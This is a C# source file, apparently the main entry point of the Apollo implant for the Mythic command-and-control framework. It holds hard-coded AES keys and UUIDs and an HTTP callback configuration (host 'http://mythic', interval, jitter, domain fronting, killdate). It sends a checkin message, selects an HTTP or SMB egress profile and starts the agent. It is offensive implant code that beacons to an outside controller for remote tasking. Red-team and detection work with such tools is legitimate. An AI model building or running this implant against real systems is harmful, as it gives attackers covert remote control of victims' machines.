#define C2PROFILE_NAME_UPPER
// supported profiles get undefined
#if DEBUG
#undef SMBSERVER
#undef HTTP
// then we define the c2 profile we want to use on compilation
#define HTTP
#define SMBSERVER
#endif

using IPC;
using Mythic.C2Profiles;
using System;
using System.IO.Pipes;
using System.Linq;
using System.Runtime.Serialization.Formatters.Binary;
using System.Windows.Forms;
using PSKCryptography;
using HttpTransport;
using ApolloInterop.Serializers;
using System.Collections.Generic;
using ApolloInterop.Structs.MythicStructs;

namespace Apollo
{
    class Apollo
    {

#if DEBUG
        public static string AgentUUID = "8efc9695-46a7-4f55-ae38-892ec43f3c87";
#endif

        [STAThread]
        static void Main(string[] args)
        {
            string aesKey = "ACstCeIXHEqdn/QM3YsAX24yfRUX6JBtOdhkAwnfQrw=";
            string uuid = "9f006dd8-7036-455b-99ed-d0b5f19ba921";
            PSKCryptographyProvider psk = new PSKCryptographyProvider(uuid, aesKey);
            EncryptedJsonSerializer ej = new EncryptedJsonSerializer(psk);
            Dictionary<string, string> parameters = new Dictionary<string, string>()
            {
                { "callback_interval", "5" },
                { "callback_jitter", "0" },
                { "callback_port", "80" },
                { "callback_host", "http://mythic" },
                { "post_uri", "data" },
                { "encrypted_exchange_check", "T" },
                { "proxy_host", "" },
                { "proxy_port", "" },
                { "proxy_user", "" },
                { "proxy_pass", "" },
                { "domain_front", "domain_front" },
                { "killdate", "-1" },
                { "USER_AGENT", "Apollo-Refactor" }
            };
            CheckinMessage Checkin = new CheckinMessage()
            {
                Action = "checkin",
                OS = "Windows",
                User = "tester",
                Host = "test_host",
                PID = 10,
                IP = "127.0.0.1",
                UUID = uuid,
                Architecture = "x64",
                Domain = "TESTDOMAIN",
                IntegrityLevel = IntegrityLevel.HighIntegrity,
                ExternalIP = "99.99.99.99",
            };
            HttpTransport.HttpProfile http = new HttpTransport.HttpProfile(parameters, ej);
            http.Connect(Checkin);
            Console.WriteLine();
#if HTTP
#if DEBUG
        DefaultProfile profile;
            if (args.Length == 2)
            {
                profile = new DefaultProfile(args[0], args[1]);

            }
            else
            {
                profile = new DefaultProfile(AgentUUID, "48OJw9IWxquvk58QhHOPV0j562sqMVPKvMMya/dsdng=");
            }
#else
            DefaultProfile profile = new DefaultProfile();
#endif
#elif SMBSERVER
#if DEBUG
            SMBServerProfile profile = new SMBServerProfile("q5bptea4-2t2v-0e6g-qogh-rmoce5fr6gzq", AgentUUID, "65U+1Y1RXuE2AC7oOyYC7PnWtDdraaECgG6u1wvMpSI=");
#else
            SMBServerProfile profile = new SMBServerProfile();
#endif
#else
#error NO VALID EGRESS PROFILE SELECTED
#endif

               Agent implant = new Agent(profile);
               implant.Start();
        }
    }

}
